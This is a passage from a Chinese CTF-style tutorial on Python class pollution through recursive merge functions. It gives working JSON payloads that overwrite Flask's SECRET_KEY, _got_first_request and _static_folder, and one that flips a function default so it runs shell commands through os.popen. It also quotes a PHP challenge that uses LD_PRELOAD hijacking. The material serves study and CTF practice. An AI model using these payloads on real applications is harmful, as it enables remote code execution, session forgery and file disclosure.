+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">evil</span>(arg_1 ,<span style="color:#666">*</span>,shell <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">False</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#a2f;font-weight:bold">not</span> shell:
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f">print</span>(arg_1)
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f">print</span>(<span style="color:#a2f">__import__</span>(<span style="color:#b44">&#34;os&#34;</span>)<span style="color:#666">.</span>popen(arg_1)<span style="color:#666">.</span>read())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>evil_payload <span style="color:#666">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#b44">&#34;__init__&#34;</span> : {
+</span></span><span style="display:flex;"><span>        <span style="color:#b44">&#34;__globals__&#34;</span> : {
+</span></span><span style="display:flex;"><span>            <span style="color:#b44">&#34;evilFunc&#34;</span> : {
+</span></span><span style="display:flex;"><span>                <span style="color:#b44">&#34;__kwdefaults__&#34;</span> : {
+</span></span><span style="display:flex;"><span>                    <span style="color:#b44">&#34;shell&#34;</span> : <span style="color:#a2f;font-weight:bold">True</span>
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这样子就可以进行污染了。</p>
+<h2 id="特定值污染">特定值污染 <a href="#%e7%89%b9%e5%ae%9a%e5%80%bc%e6%b1%a1%e6%9f%93" class="anchor">🔗</a></h2><h3 id="环境变量污染">环境变量污染 <a href="#%e7%8e%af%e5%a2%83%e5%8f%98%e9%87%8f%e6%b1%a1%e6%9f%93" class="anchor">🔗</a></h3><p>在这几天的i春秋的比赛当中出了这么一个赛题</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#666">&lt;?</span>php
+</span></span><span style="display:flex;"><span>highlight_file(<span style="color:#800">__FILE__</span>);
+</span></span><span style="display:flex;"><span>error_reporting(<span style="color:#a2f;font-weight:bold">E_ALL</span>);
+</span></span><span style="display:flex;"><span>ini_set(<span style="color:#b44">&#39;display_errors&#39;</span>, <span style="color:#666">1</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">function</span> <span style="color:#00a000">filter</span>(<span style="color:#b8860b">$a</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$pattern</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">array</span>(<span style="color:#b44">&#39;\&#39;&#39;</span>, <span style="color:#b44">&#39;&#34;&#39;</span>,<span style="color:#b44">&#39;%&#39;</span>,<span style="color:#b44">&#39;\(&#39;</span>,<span style="color:#b44">&#39;\)&#39;</span>,<span style="color:#b44">&#39;;&#39;</span>,<span style="color:#b44">&#39;bash&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$pattern</span> <span style="color:#666">=</span> <span style="color:#b44">&#39;/&#39;</span> <span style="color:#666">.</span> implode(<span style="color:#b44">&#39;|&#39;</span>, <span style="color:#b8860b">$pattern</span>) <span style="color:#666">.</span> <span style="color:#b44">&#39;/i&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">if</span>(preg_match(<span style="color:#b8860b">$pattern</span>,<span style="color:#b8860b">$a</span>)){
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">die</span>(<span style="color:#b44">&#34;No injecting!!!&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">return</span> <span style="color:#b8860b">$a</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">ENV</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$key</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$value</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$math</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">function</span> __toString()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$key</span><span style="color:#666">=</span>filter(<span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">key</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$value</span><span style="color:#666">=</span>filter(<span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">value</span>);
+</span></span><span style="display:flex;"><span>        putenv(<span style="color:#b44">&#34;</span><span style="color:#b68;font-weight:bold">$key</span><span style="color:#b44">=</span><span style="color:#b68;font-weight:bold">$value</span><span style="color:#b44">&#34;</span>);
+</span></span><span style="display:flex;"><span>        system(<span style="color:#b44">&#34;cat hints.txt&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">function</span> __wakeup()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span> (isset(<span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">math</span><span style="color:#666">-&gt;</span><span style="color:#b44">flag</span>))
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">echo</span> getenv(<span style="color:#b44">&#34;LD_PRELOAD&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">echo</span> <span style="color:#b44">&#34;YesYes&#34;</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#a2f;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">echo</span> <span style="color:#b44">&#34;YesYesYes&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">DIFF</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$callback</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$back</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">private</span> <span style="color:#b8860b">$flag</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">function</span> __isset(<span style="color:#b8860b">$arg1</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        system(<span style="color:#b44">&#34;cat /flag&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">callback</span><span style="color:#666">-&gt;</span><span style="color:#b44">p</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">echo</span> <span style="color:#b44">&#34;You are stupid, what exactly is your identity?&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">FILE</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$filename</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$enviroment</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">function</span> __get(<span style="color:#b8860b">$arg1</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#b44">&#34;hacker&#34;</span><span style="color:#666">==</span><span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">enviroment</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">echo</span> <span style="color:#b44">&#34;Hacker is bad guy!!!&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">function</span> __call(<span style="color:#b8860b">$function_name</span>,<span style="color:#b8860b">$value</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span> (preg_match(<span style="color:#b44">&#39;/\.[^.]*$/&#39;</span>, <span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">filename</span>, <span style="color:#b8860b">$matches</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#b8860b">$uploadDir</span> <span style="color:#666">=</span> <span style="color:#b44">&#34;/tmp/&#34;</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#b8860b">$destination</span> <span style="color:#666">=</span> <span style="color:#b8860b">$uploadDir</span> <span style="color:#666">.</span> md5(time()) <span style="color:#666">.</span> <span style="color:#b8860b">$matches</span>[<span style="color:#666">0</span>];
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">if</span> (<span style="color:#666">!</span>is_dir(<span style="color:#b8860b">$uploadDir</span>)) {
+</span></span><span style="display:flex;"><span>                mkdir(<span style="color:#b8860b">$uploadDir</span>, <span style="color:#666">0755</span>, <span style="color:#a2f;font-weight:bold">true</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            file_put_contents(<span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">filename</span>, base64_decode(<span style="color:#b8860b">$value</span>[<span style="color:#666">0</span>]));
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">if</span> (rename(<span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">filename</span>, <span style="color:#b8860b">$destination</span>)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a2f;font-weight:bold">echo</span> <span style="color:#b44">&#34;文件成功移动到</span><span style="color:#b68;font-weight:bold">${</span><span style="color:#b8860b">destination</span><span style="color:#b68;font-weight:bold">}</span><span style="color:#b44">&#34;</span>;
+</span></span><span style="display:flex;"><span>            } <span style="color:#a2f;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#a2f;font-weight:bold">echo</span> <span style="color:#b44">&#39;文件移动失败。&#39;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#a2f;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">echo</span> <span style="color:#b44">&#34;非法文件名。&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">FUN</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$fun</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$value</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">function</span> __get(<span style="color:#b8860b">$name</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">echo</span> <span style="color:#b44">&#34;Hacker!aaaaaaaaaaaaa&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">fun</span><span style="color:#666">-&gt;</span><span style="color:#b44">getflag</span>(<span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">value</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这个是打php的ld_preload
+然后如果说他是利用python来写的题目的话，我们就可以通过污染环境变量来打ld_preload劫持，有些时候说不定还能打出非预期，嘻嘻。</p>
+<h3 id="flask特定属性污染">flask特定属性污染 <a href="#flask%e7%89%b9%e5%ae%9a%e5%b1%9e%e6%80%a7%e6%b1%a1%e6%9f%93" class="anchor">🔗</a></h3><h4 id="密钥替换">密钥替换 <a href="#%e5%af%86%e9%92%a5%e6%9b%bf%e6%8d%a2" class="anchor">🔗</a></h4><p>这里直接贴代码吧，可以造成任意session伪造甚至改变pin码</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">from</span> <span style="color:#00f;font-weight:bold">flask</span> <span style="color:#a2f;font-weight:bold">import</span> Flask,request
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">json</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#666">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">merge</span>(src, dst):
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic"># Recursive merge function</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">for</span> k, v <span style="color:#a2f;font-weight:bold">in</span> src<span style="color:#666">.</span>items():
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#a2f">hasattr</span>(dst, <span style="color:#b44">&#39;__getitem__&#39;</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">if</span> dst<span style="color:#666">.</span>get(k) <span style="color:#a2f;font-weight:bold">and</span> <span style="color:#a2f">type</span>(v) <span style="color:#666">==</span> <span style="color:#a2f">dict</span>:
+</span></span><span style="display:flex;"><span>                merge(v, dst<span style="color:#666">.</span>get(k))
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>                dst[k] <span style="color:#666">=</span> v
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">elif</span> <span style="color:#a2f">hasattr</span>(dst, k) <span style="color:#a2f;font-weight:bold">and</span> <span style="color:#a2f">type</span>(v) <span style="color:#666">==</span> <span style="color:#a2f">dict</span>:
+</span></span><span style="display:flex;"><span>            merge(v, <span style="color:#a2f">getattr</span>(dst, k))
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f">setattr</span>(dst, k, v)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">cls</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">def</span> __init__(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>instance <span style="color:#666">=</span> cls()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">@app.route</span>(<span style="color:#b44">&#39;/&#39;</span>,methods<span style="color:#666">=</span>[<span style="color:#b44">&#39;POST&#39;</span>, <span style="color:#b44">&#39;GET&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">index</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">if</span> request<span style="color:#666">.</span>data:
+</span></span><span style="display:flex;"><span>        merge(json<span style="color:#666">.</span>loads(request<span style="color:#666">.</span>data), instance)
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">return</span> <span style="color:#b44">&#34;[+]Config:</span><span style="color:#b68;font-weight:bold">%s</span><span style="color:#b44">&#34;</span><span style="color:#666">%</span>(app<span style="color:#666">.</span>config[<span style="color:#b44">&#39;SECRET_KEY&#39;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app<span style="color:#666">.</span>run(host<span style="color:#666">=</span><span style="color:#b44">&#34;0.0.0.0&#34;</span>)
+</span></span></code></pre></div><p>污染链</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#b44">&#34;__init__&#34;</span> : {
+</span></span><span style="display:flex;"><span>        <span style="color:#b44">&#34;__globals__&#34;</span> : {
+</span></span><span style="display:flex;"><span>            <span style="color:#b44">&#34;app&#34;</span> : {
+</span></span><span style="display:flex;"><span>                <span style="color:#b44">&#34;config&#34;</span> : {
+</span></span><span style="display:flex;"><span>                    <span style="color:#b44">&#34;SECRET_KEY&#34;</span> :<span style="color:#b44">&#34;Polluted~&#34;</span>
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="_got_first_request污染">_got_first_request污染 <a href="#_got_first_request%e6%b1%a1%e6%9f%93" class="anchor">🔗</a></h4><p>用于判定是否某次请求为自<code>Flask</code>启动后第一次请求，是<code>Flask.got_first_request</code>函数的返回值，此外还会影响装饰器<code>app.before_first_request</code>的调用，而<code>_got_first_request</code>值为假时才会调用：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">from</span> <span style="color:#00f;font-weight:bold">flask</span> <span style="color:#a2f;font-weight:bold">import</span> Flask,request
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">json</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#666">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">merge</span>(src, dst):
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic"># Recursive merge function</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">for</span> k, v <span style="color:#a2f;font-weight:bold">in</span> src<span style="color:#666">.</span>items():
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#a2f">hasattr</span>(dst, <span style="color:#b44">&#39;__getitem__&#39;</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">if</span> dst<span style="color:#666">.</span>get(k) <span style="color:#a2f;font-weight:bold">and</span> <span style="color:#a2f">type</span>(v) <span style="color:#666">==</span> <span style="color:#a2f">dict</span>:
+</span></span><span style="display:flex;"><span>                merge(v, dst<span style="color:#666">.</span>get(k))
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>                dst[k] <span style="color:#666">=</span> v
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">elif</span> <span style="color:#a2f">hasattr</span>(dst, k) <span style="color:#a2f;font-weight:bold">and</span> <span style="color:#a2f">type</span>(v) <span style="color:#666">==</span> <span style="color:#a2f">dict</span>:
+</span></span><span style="display:flex;"><span>            merge(v, <span style="color:#a2f">getattr</span>(dst, k))
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f">setattr</span>(dst, k, v)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">cls</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">def</span> __init__(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>instance <span style="color:#666">=</span> cls()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#666">=</span> <span style="color:#b44">&#34;Is flag here?&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">@app.before_first_request</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">init</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">global</span> flag
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#a2f">hasattr</span>(app, <span style="color:#b44">&#34;special&#34;</span>) <span style="color:#a2f;font-weight:bold">and</span> app<span style="color:#666">.</span>special <span style="color:#666">==</span> <span style="color:#b44">&#34;U_Polluted_It&#34;</span>:
+</span></span><span style="display:flex;"><span>        flag <span style="color:#666">=</span> <span style="color:#a2f">open</span>(<span style="color:#b44">&#34;flag&#34;</span>, <span style="color:#b44">&#34;rt&#34;</span>)<span style="color:#666">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">@app.route</span>(<span style="color:#b44">&#39;/&#39;</span>,methods<span style="color:#666">=</span>[<span style="color:#b44">&#39;POST&#39;</span>, <span style="color:#b44">&#39;GET&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">index</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">if</span> request<span style="color:#666">.</span>data:
+</span></span><span style="display:flex;"><span>        merge(json<span style="color:#666">.</span>loads(request<span style="color:#666">.</span>data), instance)
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">global</span> flag
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f">setattr</span>(app, <span style="color:#b44">&#34;special&#34;</span>, <span style="color:#b44">&#34;U_Polluted_It&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">return</span> flag
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app<span style="color:#666">.</span>run(host<span style="color:#666">=</span><span style="color:#b44">&#34;0.0.0.0&#34;</span>)
+</span></span></code></pre></div><p>链子</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload<span style="color:#666">=</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#b44">&#34;__init__&#34;</span>:{
+</span></span><span style="display:flex;"><span>        <span style="color:#b44">&#34;__globals__&#34;</span>:{
+</span></span><span style="display:flex;"><span>            <span style="color:#b44">&#34;app&#34;</span>:{
+</span></span><span style="display:flex;"><span>                <span style="color:#b44">&#34;_got_first_request&#34;</span>:<span style="color:#a2f;font-weight:bold">False</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="_static_url_path污染">_static_url_path污染 <a href="#_static_url_path%e6%b1%a1%e6%9f%93" class="anchor">🔗</a></h4><div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f">@app.route</span>(<span style="color:#b44">&#39;/&#39;</span>,methods<span style="color:#666">=</span>[<span style="color:#b44">&#39;POST&#39;</span>, <span style="color:#b44">&#39;GET&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">index</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">if</span> request<span style="color:#666">.</span>data:
+</span></span><span style="display:flex;"><span>        merge(json<span style="color:#666">.</span>loads(request<span style="color:#666">.</span>data), instance)
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">return</span> <span style="color:#b44">&#34;flag in ./flag but heres only static/index.html&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload<span style="color:#666">=</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#b44">&#34;__init__&#34;</span>:{
+</span></span><span style="display:flex;"><span>        <span style="color:#b44">&#34;__globals__&#34;</span>:{
+</span></span><span style="display:flex;"><span>            <span style="color:#b44">&#34;app&#34;</span>:{
+</span></span><span style="display:flex;"><span>                <span style="color:#b44">&#34;_static_folder&#34;</span>:<span style="color:#b44">&#34;./&#34;</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="ospathpardir">os.path.pardir <a href="#ospathpardir" class="anchor">🔗</a></h4><div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#080;font-style:italic">#app.py</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">from</span> <span style="color:#00f;font-weight:bold">flask</span> <span style="color:#a2f;font-weight:bold">import</span> Flask,request
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">json</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#666">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">merge</span>(src, dst):
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic"># Recursive merge function</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">for</span> k, v <span style="color:#a2f;font-weight:bold">in</span> src<span style="color:#666">.</span>items():
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span> <span style="color:#a2f">hasattr</span>(dst, <span style="color:#b44">&#39;__getitem__&#39;</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">if</span> dst<span style="color:#666">.</span>get(k) <span style="color:#a2f;font-weight:bold">and</span> <span style="color:#a2f">type</span>(v) <span style="color:#666">==</span> <span style="color:#a2f">dict</span>:
+</span></span><span style="display:flex;"><span>                merge(v, dst<span style="color:#666">.</span>get(k))
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>                dst[k] <span style="color:#666">=</span> v
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">elif</span> <span style="color:#a2f">hasattr</span>(dst, k) <span style="color:#a2f;font-weight:bold">and</span> <span style="color:#a2f">type</span>(v) <span style="color:#666">==</span> <span style="color:#a2f">dict</span>:
+</span></span><span style="display:flex;"><span>            merge(v, <span style="color:#a2f">getattr</span>(dst, k))
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f">setattr</span>(dst, k, v)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">cls</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">def</span> __init__(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>instance <span style="color:#666">=</span> cls()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">@app.route</span>(<span style="color:#b44">&#39;/&#39;</span>,methods<span style="color:#666">=</span>[<span style="color:#b44">&#39;POST&#39;</span>, <span style="color:#b44">&#39;GET&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">index</span>():
